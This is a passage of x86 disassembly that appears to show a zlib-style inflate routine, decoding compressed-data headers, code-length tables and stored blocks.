  40644a:	8b bc 24 90 00 00 00 	mov    0x90(%esp),%edi
  406451:	01 d0                	add    %edx,%eax
  406453:	09 de                	or     %ebx,%esi
  406455:	89 47 2c             	mov    %eax,0x2c(%edi)
  406458:	74 12                	je     0x40646c
  40645a:	83 bc 24 94 00 00 00 	cmpl   $0x4,0x94(%esp)
  406461:	04 
  406462:	8b 44 24 38          	mov    0x38(%esp),%eax
  406466:	0f 85 b9 fe ff ff    	jne    0x406325
  40646c:	8b 5c 24 38          	mov    0x38(%esp),%ebx
  406470:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  406475:	85 db                	test   %ebx,%ebx
  406477:	0f 45 c3             	cmovne %ebx,%eax
  40647a:	83 c4 7c             	add    $0x7c,%esp
  40647d:	5b                   	pop    %ebx
  40647e:	5e                   	pop    %esi
  40647f:	5f                   	pop    %edi
  406480:	5d                   	pop    %ebp
  406481:	c3                   	ret
  406482:	83 fb 1f             	cmp    $0x1f,%ebx
  406485:	77 2a                	ja     0x4064b1
  406487:	85 ff                	test   %edi,%edi
  406489:	0f 84 71 fc ff ff    	je     0x406100
  40648f:	89 d9                	mov    %ebx,%ecx
  406491:	eb 08                	jmp    0x40649b
  406493:	85 ff                	test   %edi,%edi
  406495:	0f 84 35 0b 00 00    	je     0x406fd0
  40649b:	83 c5 01             	add    $0x1,%ebp
  40649e:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4064a2:	83 ef 01             	sub    $0x1,%edi
  4064a5:	d3 e0                	shl    %cl,%eax
  4064a7:	83 c1 08             	add    $0x8,%ecx
  4064aa:	01 c6                	add    %eax,%esi
  4064ac:	83 f9 1f             	cmp    $0x1f,%ecx
  4064af:	76 e2                	jbe    0x406493
  4064b1:	8b 44 24 24          	mov    0x24(%esp),%eax
  4064b5:	8b 40 20             	mov    0x20(%eax),%eax
  4064b8:	85 c0                	test   %eax,%eax
  4064ba:	74 03                	je     0x4064bf
  4064bc:	89 70 04             	mov    %esi,0x4(%eax)
  4064bf:	8b 44 24 24          	mov    0x24(%esp),%eax
  4064c3:	f6 40 11 02          	testb  $0x2,0x11(%eax)
  4064c7:	0f 85 97 10 00 00    	jne    0x407564
  4064cd:	8b 44 24 24          	mov    0x24(%esp),%eax
  4064d1:	31 f6                	xor    %esi,%esi
  4064d3:	31 db                	xor    %ebx,%ebx
  4064d5:	c7 00 03 00 00 00    	movl   $0x3,(%eax)
  4064db:	e9 9a 05 00 00       	jmp    0x406a7a
  4064e0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4064e4:	8b 40 40             	mov    0x40(%eax),%eax
  4064e7:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4064eb:	c7 01 0f 00 00 00    	movl   $0xf,(%ecx)
  4064f1:	85 c0                	test   %eax,%eax
  4064f3:	0f 84 a7 0b 00 00    	je     0x4070a0
  4064f9:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  4064fd:	39 c7                	cmp    %eax,%edi
  4064ff:	0f 46 c7             	cmovbe %edi,%eax
  406502:	39 c8                	cmp    %ecx,%eax
  406504:	0f 47 c1             	cmova  %ecx,%eax
  406507:	85 c0                	test   %eax,%eax
  406509:	0f 84 f1 fb ff ff    	je     0x406100
  40650f:	89 44 24 08          	mov    %eax,0x8(%esp)
  406513:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406517:	8b 44 24 30          	mov    0x30(%esp),%eax
  40651b:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40651f:	89 04 24             	mov    %eax,(%esp)
  406522:	e8 a1 42 00 00       	call   0x40a7c8
  406527:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  40652b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40652f:	29 54 24 28          	sub    %edx,0x28(%esp)
  406533:	01 54 24 30          	add    %edx,0x30(%esp)
  406537:	29 50 40             	sub    %edx,0x40(%eax)
  40653a:	29 d7                	sub    %edx,%edi
  40653c:	01 d5                	add    %edx,%ebp
  40653e:	8b 00                	mov    (%eax),%eax
  406540:	e9 bb f7 ff ff       	jmp    0x405d00
  406545:	8b 44 24 24          	mov    0x24(%esp),%eax
  406549:	8b 40 68             	mov    0x68(%eax),%eax
  40654c:	89 44 24 48          	mov    %eax,0x48(%esp)
  406550:	8b 54 24 24          	mov    0x24(%esp),%edx
  406554:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406558:	8b 42 60             	mov    0x60(%edx),%eax
  40655b:	89 44 24 58          	mov    %eax,0x58(%esp)
  40655f:	03 42 64             	add    0x64(%edx),%eax
  406562:	89 44 24 54          	mov    %eax,0x54(%esp)
  406566:	8b 54 24 54          	mov    0x54(%esp),%edx
  40656a:	39 54 24 48          	cmp    %edx,0x48(%esp)
  40656e:	0f 83 ae 12 00 00    	jae    0x407822
  406574:	8b 44 24 24          	mov    0x24(%esp),%eax
  406578:	8b 48 54             	mov    0x54(%eax),%ecx
  40657b:	8b 50 4c             	mov    0x4c(%eax),%edx
  40657e:	b8 01 00 00 00       	mov    $0x1,%eax
  406583:	d3 e0                	shl    %cl,%eax
  406585:	89 d5                	mov    %edx,%ebp
  406587:	89 54 24 40          	mov    %edx,0x40(%esp)
  40658b:	8d 40 ff             	lea    -0x1(%eax),%eax
  40658e:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406592:	21 f0                	and    %esi,%eax
  406594:	8d 44 85 00          	lea    0x0(%ebp,%eax,4),%eax
  406598:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  40659c:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  4065a0:	0f b6 c1             	movzbl %cl,%eax
  4065a3:	39 c3                	cmp    %eax,%ebx
  4065a5:	73 58                	jae    0x4065ff
  4065a7:	85 ff                	test   %edi,%edi
  4065a9:	0f 84 40 11 00 00    	je     0x4076ef
  4065af:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  4065b3:	89 d9                	mov    %ebx,%ecx
  4065b5:	eb 11                	jmp    0x4065c8
  4065b7:	89 f6                	mov    %esi,%esi
  4065b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4065c0:	85 ff                	test   %edi,%edi
  4065c2:	0f 84 08 0a 00 00    	je     0x406fd0
  4065c8:	83 c5 01             	add    $0x1,%ebp
  4065cb:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4065cf:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  4065d3:	83 ef 01             	sub    $0x1,%edi
  4065d6:	d3 e0                	shl    %cl,%eax
  4065d8:	83 c1 08             	add    $0x8,%ecx
  4065db:	01 c6                	add    %eax,%esi
  4065dd:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4065e1:	21 f0                	and    %esi,%eax
  4065e3:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  4065e6:	0f b6 58 01          	movzbl 0x1(%eax),%ebx
  4065ea:	0f b7 50 02          	movzwl 0x2(%eax),%edx
  4065ee:	0f b6 c3             	movzbl %bl,%eax
  4065f1:	39 c8                	cmp    %ecx,%eax
  4065f3:	77 cb                	ja     0x4065c0
  4065f5:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4065f9:	89 dd                	mov    %ebx,%ebp
  4065fb:	89 cb                	mov    %ecx,%ebx
  4065fd:	89 e9                	mov    %ebp,%ecx
  4065ff:	66 83 fa 0f          	cmp    $0xf,%dx
  406603:	0f 86 c7 0c 00 00    	jbe    0x4072d0
  406609:	66 83 fa 10          	cmp    $0x10,%dx
  40660d:	0f 84 57 10 00 00    	je     0x40766a
  406613:	66 83 fa 11          	cmp    $0x11,%dx
  406617:	0f 84 fc 10 00 00    	je     0x407719
  40661d:	8d 48 07             	lea    0x7(%eax),%ecx
  406620:	39 cb                	cmp    %ecx,%ebx
  406622:	89 ca                	mov    %ecx,%edx
  406624:	73 3f                	jae    0x406665
  406626:	85 ff                	test   %edi,%edi
  406628:	0f 84 c1 10 00 00    	je     0x4076ef
  40662e:	89 d9                	mov    %ebx,%ecx
  406630:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  406634:	89 c3                	mov    %eax,%ebx
  406636:	89 d0                	mov    %edx,%eax
  406638:	eb 0e                	jmp    0x406648
  40663a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  406640:	85 ff                	test   %edi,%edi
  406642:	0f 84 88 09 00 00    	je     0x406fd0
  406648:	83 c5 01             	add    $0x1,%ebp
  40664b:	0f b6 55 ff          	movzbl -0x1(%ebp),%edx
  40664f:	83 ef 01             	sub    $0x1,%edi
  406652:	d3 e2                	shl    %cl,%edx
  406654:	83 c1 08             	add    $0x8,%ecx
  406657:	01 d6                	add    %edx,%esi
  406659:	39 c1                	cmp    %eax,%ecx
  40665b:	72 e3                	jb     0x406640
  40665d:	89 d8                	mov    %ebx,%eax
  40665f:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406663:	89 cb                	mov    %ecx,%ebx
  406665:	89 c1                	mov    %eax,%ecx
  406667:	29 c3                	sub    %eax,%ebx
  406669:	d3 ee                	shr    %cl,%esi
  40666b:	83 eb 07             	sub    $0x7,%ebx
  40666e:	89 f1                	mov    %esi,%ecx
  406670:	89 f2                	mov    %esi,%edx
  406672:	83 e1 7f             	and    $0x7f,%ecx
  406675:	8d 71 0b             	lea    0xb(%ecx),%esi
  406678:	89 f1                	mov    %esi,%ecx
  40667a:	89 d6                	mov    %edx,%esi
  40667c:	31 d2                	xor    %edx,%edx
  40667e:	c1 ee 07             	shr    $0x7,%esi
  406681:	8b 44 24 48          	mov    0x48(%esp),%eax
  406685:	89 cd                	mov    %ecx,%ebp
  406687:	01 c8                	add    %ecx,%eax
  406689:	3b 44 24 54          	cmp    0x54(%esp),%eax
  40668d:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406691:	0f 87 cb 13 00 00    	ja     0x407a62
  406697:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  40669b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40669f:	83 c1 38             	add    $0x38,%ecx
  4066a2:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  4066a5:	01 e9                	add    %ebp,%ecx
  4066a7:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  4066ab:	8d 4c 4d 00          	lea    0x0(%ebp,%ecx,2),%ecx
  4066af:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  4066b3:	66 89 10             	mov    %dx,(%eax)
  4066b6:	83 c0 02             	add    $0x2,%eax
  4066b9:	39 c8                	cmp    %ecx,%eax
  4066bb:	75 f6                	jne    0x4066b3
  4066bd:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4066c1:	8b 54 24 24          	mov    0x24(%esp),%edx
  4066c5:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4066c9:	89 42 68             	mov    %eax,0x68(%edx)
  4066cc:	89 44 24 48          	mov    %eax,0x48(%esp)
  4066d0:	e9 91 fe ff ff       	jmp    0x406566
  4066d5:	83 fb 0d             	cmp    $0xd,%ebx
  4066d8:	77 36                	ja     0x406710
  4066da:	85 ff                	test   %edi,%edi
  4066dc:	0f 84 1e fa ff ff    	je     0x406100
  4066e2:	89 d9                	mov    %ebx,%ecx
  4066e4:	eb 12                	jmp    0x4066f8
  4066e6:	8d 76 00             	lea    0x0(%esi),%esi
  4066e9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4066f0:	85 ff                	test   %edi,%edi
  4066f2:	0f 84 d8 08 00 00    	je     0x406fd0
  4066f8:	83 c5 01             	add    $0x1,%ebp
  4066fb:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  4066ff:	83 ef 01             	sub    $0x1,%edi
  406702:	d3 e0                	shl    %cl,%eax
  406704:	83 c1 08             	add    $0x8,%ecx
  406707:	01 c6                	add    %eax,%esi
  406709:	83 f9 0d             	cmp    $0xd,%ecx
  40670c:	76 e2                	jbe    0x4066f0
  40670e:	89 cb                	mov    %ecx,%ebx
  406710:	89 f0                	mov    %esi,%eax
  406712:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406716:	89 f2                	mov    %esi,%edx
  406718:	c1 e8 05             	shr    $0x5,%eax
  40671b:	83 e2 1f             	and    $0x1f,%edx
  40671e:	83 eb 0e             	sub    $0xe,%ebx
  406721:	83 e0 1f             	and    $0x1f,%eax
  406724:	81 c2 01 01 00 00    	add    $0x101,%edx
  40672a:	83 c0 01             	add    $0x1,%eax
  40672d:	89 51 60             	mov    %edx,0x60(%ecx)
  406730:	89 41 64             	mov    %eax,0x64(%ecx)
  406733:	89 f1                	mov    %esi,%ecx
  406735:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406739:	c1 e9 0a             	shr    $0xa,%ecx
  40673c:	c1 ee 0e             	shr    $0xe,%esi
  40673f:	83 e1 0f             	and    $0xf,%ecx
  406742:	83 c1 04             	add    $0x4,%ecx
  406745:	83 7c 24 3c 1e       	cmpl   $0x1e,0x3c(%esp)
  40674a:	89 c8                	mov    %ecx,%eax
  40674c:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  406750:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406754:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406757:	0f 87 6f 0c 00 00    	ja     0x4073cc
  40675d:	81 fa 1e 01 00 00    	cmp    $0x11e,%edx
  406763:	0f 87 63 0c 00 00    	ja     0x4073cc
  406769:	8b 44 24 24          	mov    0x24(%esp),%eax
  40676d:	31 d2                	xor    %edx,%edx
  40676f:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  406773:	89 d9                	mov    %ebx,%ecx
  406775:	c7 40 68 00 00 00 00 	movl   $0x0,0x68(%eax)
  40677c:	c7 00 11 00 00 00    	movl   $0x11,(%eax)
  406782:	eb 26                	jmp    0x4067aa
  406784:	8b 44 24 24          	mov    0x24(%esp),%eax
  406788:	8b 40 40             	mov    0x40(%eax),%eax
  40678b:	e9 61 fd ff ff       	jmp    0x4064f1
  406790:	8b 44 24 24          	mov    0x24(%esp),%eax
  406794:	8b 50 5c             	mov    0x5c(%eax),%edx
  406797:	89 d1                	mov    %edx,%ecx
  406799:	89 54 24 40          	mov    %edx,0x40(%esp)
  40679d:	8b 50 68             	mov    0x68(%eax),%edx
  4067a0:	39 d1                	cmp    %edx,%ecx
  4067a2:	76 58                	jbe    0x4067fc
  4067a4:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  4067a8:	89 d9                	mov    %ebx,%ecx
  4067aa:	83 f9 02             	cmp    $0x2,%ecx
  4067ad:	77 1f                	ja     0x4067ce
  4067af:	85 ff                	test   %edi,%edi
  4067b1:	0f 84 4d 0f 00 00    	je     0x407704
  4067b7:	83 44 24 3c 01       	addl   $0x1,0x3c(%esp)
  4067bc:	83 ef 01             	sub    $0x1,%edi
  4067bf:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4067c3:	0f b6 40 ff          	movzbl -0x1(%eax),%eax
  4067c7:	d3 e0                	shl    %cl,%eax
  4067c9:	83 c1 08             	add    $0x8,%ecx
  4067cc:	01 c6                	add    %eax,%esi
  4067ce:	83 c2 01             	add    $0x1,%edx
  4067d1:	89 f3                	mov    %esi,%ebx
  4067d3:	83 e9 03             	sub    $0x3,%ecx
  4067d6:	83 e3 07             	and    $0x7,%ebx
  4067d9:	0f b7 84 12 7e e0 40 	movzwl 0x40e07e(%edx,%edx,1),%eax
  4067e0:	00 
  4067e1:	c1 ee 03             	shr    $0x3,%esi
  4067e4:	3b 54 24 40          	cmp    0x40(%esp),%edx
  4067e8:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  4067ec:	89 55 68             	mov    %edx,0x68(%ebp)
  4067ef:	66 89 5c 45 70       	mov    %bx,0x70(%ebp,%eax,2)
  4067f4:	72 b4                	jb     0x4067aa
  4067f6:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  4067fa:	89 cb                	mov    %ecx,%ebx
  4067fc:	83 fa 12             	cmp    $0x12,%edx
  4067ff:	8d 84 12 80 e0 40 00 	lea    0x40e080(%edx,%edx,1),%eax
  406806:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40680a:	77 23                	ja     0x40682f
  40680c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406810:	0f b7 10             	movzwl (%eax),%edx
  406813:	83 c0 02             	add    $0x2,%eax
  406816:	3d a6 e0 40 00       	cmp    $0x40e0a6,%eax
  40681b:	66 c7 44 51 70 00 00 	movw   $0x0,0x70(%ecx,%edx,2)
  406822:	75 ec                	jne    0x406810
  406824:	8b 44 24 24          	mov    0x24(%esp),%eax
  406828:	c7 40 68 13 00 00 00 	movl   $0x13,0x68(%eax)
  40682f:	8b 44 24 24          	mov    0x24(%esp),%eax
  406833:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  406837:	89 48 6c             	mov    %ecx,0x6c(%eax)
  40683a:	89 48 4c             	mov    %ecx,0x4c(%eax)
  40683d:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  406841:	c7 40 54 07 00 00 00 	movl   $0x7,0x54(%eax)
  406848:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
  40684f:	00 
  406850:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  406857:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  40685b:	89 c1                	mov    %eax,%ecx
  40685d:	83 c0 54             	add    $0x54,%eax
  406860:	89 44 24 10          	mov    %eax,0x10(%esp)
  406864:	89 c8                	mov    %ecx,%eax
  406866:	83 c0 6c             	add    $0x6c,%eax
  406869:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40686d:	89 c8                	mov    %ecx,%eax
  40686f:	83 c0 70             	add    $0x70,%eax
  406872:	89 44 24 04          	mov    %eax,0x4(%esp)
  406876:	e8 55 21 00 00       	call   0x4089d0
  40687b:	85 c0                	test   %eax,%eax
  40687d:	89 44 24 38          	mov    %eax,0x38(%esp)
  406881:	0f 84 7d 0f 00 00    	je     0x407804
  406887:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  40688e:	c7 40 18 48 d6 40 00 	movl   $0x40d648,0x18(%eax)
  406895:	8b 44 24 24          	mov    0x24(%esp),%eax
  406899:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  40689f:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4068a4:	e9 60 f4 ff ff       	jmp    0x405d09
  4068a9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4068b0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4068b4:	8b 50 10             	mov    0x10(%eax),%edx
  4068b7:	f6 c6 04             	test   $0x4,%dh
  4068ba:	89 d0                	mov    %edx,%eax
  4068bc:	0f 84 a4 00 00 00    	je     0x406966
  4068c2:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4068c6:	8b 51 40             	mov    0x40(%ecx),%edx
  4068c9:	39 d7                	cmp    %edx,%edi
  4068cb:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  4068cf:	0f 46 d7             	cmovbe %edi,%edx
  4068d2:	89 d1                	mov    %edx,%ecx
  4068d4:	89 54 24 40          	mov    %edx,0x40(%esp)
  4068d8:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  4068dc:	85 c9                	test   %ecx,%ecx
  4068de:	74 77                	je     0x406957
  4068e0:	8b 54 24 24          	mov    0x24(%esp),%edx
  4068e4:	8b 52 20             	mov    0x20(%edx),%edx
  4068e7:	85 d2                	test   %edx,%edx
  4068e9:	74 4b                	je     0x406936
  4068eb:	8b 4a 10             	mov    0x10(%edx),%ecx
  4068ee:	85 c9                	test   %ecx,%ecx
  4068f0:	89 4c 24 44          	mov    %ecx,0x44(%esp)
  4068f4:	74 40                	je     0x406936
  4068f6:	8b 42 14             	mov    0x14(%edx),%eax
  4068f9:	2b 44 24 3c          	sub    0x3c(%esp),%eax
  4068fd:	8b 52 18             	mov    0x18(%edx),%edx
  406900:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  406904:	89 c1                	mov    %eax,%ecx
  406906:	8b 44 24 40          	mov    0x40(%esp),%eax
  40690a:	01 c8                	add    %ecx,%eax
  40690c:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406910:	89 d0                	mov    %edx,%eax
  406912:	29 c8                	sub    %ecx,%eax
  406914:	39 54 24 3c          	cmp    %edx,0x3c(%esp)
  406918:	8b 54 24 44          	mov    0x44(%esp),%edx
  40691c:	0f 46 44 24 40       	cmovbe 0x40(%esp),%eax
  406921:	01 ca                	add    %ecx,%edx
  406923:	89 14 24             	mov    %edx,(%esp)
  406926:	89 44 24 08          	mov    %eax,0x8(%esp)
  40692a:	e8 99 3e 00 00       	call   0x40a7c8
  40692f:	8b 54 24 24          	mov    0x24(%esp),%edx
  406933:	8b 42 10             	mov    0x10(%edx),%eax
  406936:	f6 c4 02             	test   $0x2,%ah
  406939:	0f 85 ed 0b 00 00    	jne    0x40752c
  40693f:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406943:	8b 44 24 40          	mov    0x40(%esp),%eax
  406947:	8b 51 40             	mov    0x40(%ecx),%edx
  40694a:	29 c7                	sub    %eax,%edi
  40694c:	01 c5                	add    %eax,%ebp
  40694e:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  406952:	29 c2                	sub    %eax,%edx
  406954:	89 51 40             	mov    %edx,0x40(%ecx)
  406957:	85 d2                	test   %edx,%edx
  406959:	0f 85 a1 f7 ff ff    	jne    0x406100
  40695f:	8b 44 24 24          	mov    0x24(%esp),%eax
  406963:	8b 50 10             	mov    0x10(%eax),%edx
  406966:	8b 44 24 24          	mov    0x24(%esp),%eax
  40696a:	f6 c6 08             	test   $0x8,%dh
  40696d:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%eax)
  406974:	c7 00 06 00 00 00    	movl   $0x6,(%eax)
  40697a:	75 30                	jne    0x4069ac
  40697c:	8b 44 24 24          	mov    0x24(%esp),%eax
  406980:	8b 40 20             	mov    0x20(%eax),%eax
  406983:	85 c0                	test   %eax,%eax
  406985:	0f 84 b5 00 00 00    	je     0x406a40
  40698b:	c7 40 1c 00 00 00 00 	movl   $0x0,0x1c(%eax)
  406992:	e9 a9 00 00 00       	jmp    0x406a40
  406997:	89 f6                	mov    %esi,%esi
  406999:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4069a0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4069a4:	8b 50 10             	mov    0x10(%eax),%edx
  4069a7:	f6 c6 08             	test   $0x8,%dh
  4069aa:	74 d0                	je     0x40697c
  4069ac:	85 ff                	test   %edi,%edi
  4069ae:	0f 84 4c f7 ff ff    	je     0x406100
  4069b4:	89 74 24 48          	mov    %esi,0x48(%esp)
  4069b8:	31 d2                	xor    %edx,%edx
  4069ba:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  4069be:	89 7c 24 40          	mov    %edi,0x40(%esp)
  4069c2:	89 5c 24 54          	mov    %ebx,0x54(%esp)
  4069c6:	8b 74 24 24          	mov    0x24(%esp),%esi
  4069ca:	eb 0a                	jmp    0x4069d6
  4069cc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4069d0:	3b 54 24 40          	cmp    0x40(%esp),%edx
  4069d4:	73 31                	jae    0x406a07
  4069d6:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4069da:	83 c2 01             	add    $0x1,%edx
  4069dd:	0f b6 6c 10 ff       	movzbl -0x1(%eax,%edx,1),%ebp
  4069e2:	8b 46 20             	mov    0x20(%esi),%eax
  4069e5:	85 c0                	test   %eax,%eax
  4069e7:	89 e9                	mov    %ebp,%ecx
  4069e9:	74 18                	je     0x406a03
  4069eb:	8b 78 1c             	mov    0x1c(%eax),%edi
  4069ee:	85 ff                	test   %edi,%edi
  4069f0:	74 11                	je     0x406a03
  4069f2:	8b 5e 40             	mov    0x40(%esi),%ebx
  4069f5:	3b 58 20             	cmp    0x20(%eax),%ebx
  4069f8:	73 09                	jae    0x406a03
  4069fa:	8d 43 01             	lea    0x1(%ebx),%eax
  4069fd:	89 46 40             	mov    %eax,0x40(%esi)
  406a00:	88 0c 1f             	mov    %cl,(%edi,%ebx,1)
  406a03:	85 ed                	test   %ebp,%ebp
  406a05:	75 c9                	jne    0x4069d0
  406a07:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a0b:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406a0f:	8b 7c 24 40          	mov    0x40(%esp),%edi
  406a13:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  406a17:	8b 74 24 48          	mov    0x48(%esp),%esi
  406a1b:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  406a1f:	f6 40 11 02          	testb  $0x2,0x11(%eax)
  406a23:	0f 85 7c 09 00 00    	jne    0x4073a5
  406a29:	8b 44 24 44          	mov    0x44(%esp),%eax
  406a2d:	29 d7                	sub    %edx,%edi
  406a2f:	01 d5                	add    %edx,%ebp
  406a31:	85 c0                	test   %eax,%eax
  406a33:	0f 85 c7 f6 ff ff    	jne    0x406100
  406a39:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a3d:	8b 50 10             	mov    0x10(%eax),%edx
  406a40:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a44:	f6 c6 10             	test   $0x10,%dh
  406a47:	c7 40 40 00 00 00 00 	movl   $0x0,0x40(%eax)
  406a4e:	c7 00 07 00 00 00    	movl   $0x7,(%eax)
  406a54:	0f 85 66 01 00 00    	jne    0x406bc0
  406a5a:	8b 44 24 24          	mov    0x24(%esp),%eax
  406a5e:	8b 40 20             	mov    0x20(%eax),%eax
  406a61:	85 c0                	test   %eax,%eax
  406a63:	0f 84 e7 01 00 00    	je     0x406c50
  406a69:	c7 40 24 00 00 00 00 	movl   $0x0,0x24(%eax)
  406a70:	e9 db 01 00 00       	jmp    0x406c50
  406a75:	83 fb 0f             	cmp    $0xf,%ebx
  406a78:	77 34                	ja     0x406aae
  406a7a:	85 ff                	test   %edi,%edi
  406a7c:	0f 84 7e f6 ff ff    	je     0x406100
  406a82:	89 d9                	mov    %ebx,%ecx
  406a84:	eb 12                	jmp    0x406a98
  406a86:	8d 76 00             	lea    0x0(%esi),%esi
  406a89:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  406a90:	85 ff                	test   %edi,%edi
  406a92:	0f 84 38 05 00 00    	je     0x406fd0
  406a98:	83 c5 01             	add    $0x1,%ebp
  406a9b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406a9f:	83 ef 01             	sub    $0x1,%edi
  406aa2:	d3 e0                	shl    %cl,%eax
  406aa4:	83 c1 08             	add    $0x8,%ecx
  406aa7:	01 c6                	add    %eax,%esi
  406aa9:	83 f9 0f             	cmp    $0xf,%ecx
  406aac:	76 e2                	jbe    0x406a90
  406aae:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ab2:	8b 40 20             	mov    0x20(%eax),%eax
  406ab5:	85 c0                	test   %eax,%eax
  406ab7:	74 10                	je     0x406ac9
  406ab9:	89 f3                	mov    %esi,%ebx
  406abb:	0f b6 d3             	movzbl %bl,%edx
  406abe:	89 50 08             	mov    %edx,0x8(%eax)
  406ac1:	89 f2                	mov    %esi,%edx
  406ac3:	c1 ea 08             	shr    $0x8,%edx
  406ac6:	89 50 0c             	mov    %edx,0xc(%eax)
  406ac9:	8b 44 24 24          	mov    0x24(%esp),%eax
  406acd:	8b 50 10             	mov    0x10(%eax),%edx
  406ad0:	f6 c6 02             	test   $0x2,%dh
  406ad3:	0f 85 83 09 00 00    	jne    0x40745c
  406ad9:	8b 44 24 24          	mov    0x24(%esp),%eax
  406add:	31 db                	xor    %ebx,%ebx
  406adf:	31 f6                	xor    %esi,%esi
  406ae1:	f6 c6 04             	test   $0x4,%dh
  406ae4:	c7 00 04 00 00 00    	movl   $0x4,(%eax)
  406aea:	0f 85 d5 f7 ff ff    	jne    0x4062c5
  406af0:	8b 44 24 24          	mov    0x24(%esp),%eax
  406af4:	8b 40 20             	mov    0x20(%eax),%eax
  406af7:	85 c0                	test   %eax,%eax
  406af9:	0f 84 0e f8 ff ff    	je     0x40630d
  406aff:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  406b06:	e9 02 f8 ff ff       	jmp    0x40630d
  406b0b:	90                   	nop
  406b0c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406b10:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b14:	8b 40 08             	mov    0x8(%eax),%eax
  406b17:	85 c0                	test   %eax,%eax
  406b19:	0f 84 c4 0c 00 00    	je     0x4077e3
  406b1f:	8b 44 24 24          	mov    0x24(%esp),%eax
  406b23:	8b 50 10             	mov    0x10(%eax),%edx
  406b26:	85 d2                	test   %edx,%edx
  406b28:	0f 84 b5 0c 00 00    	je     0x4077e3
  406b2e:	83 fb 1f             	cmp    $0x1f,%ebx
  406b31:	77 2d                	ja     0x406b60
  406b33:	85 ff                	test   %edi,%edi
  406b35:	0f 84 18 0a 00 00    	je     0x407553
  406b3b:	89 d9                	mov    %ebx,%ecx
  406b3d:	eb 09                	jmp    0x406b48
  406b3f:	90                   	nop
  406b40:	85 ff                	test   %edi,%edi
  406b42:	0f 84 88 04 00 00    	je     0x406fd0
  406b48:	83 c5 01             	add    $0x1,%ebp
  406b4b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406b4f:	83 ef 01             	sub    $0x1,%edi
  406b52:	d3 e0                	shl    %cl,%eax
  406b54:	83 c1 08             	add    $0x8,%ecx
  406b57:	01 c6                	add    %eax,%esi
  406b59:	83 f9 1f             	cmp    $0x1f,%ecx
  406b5c:	76 e2                	jbe    0x406b40
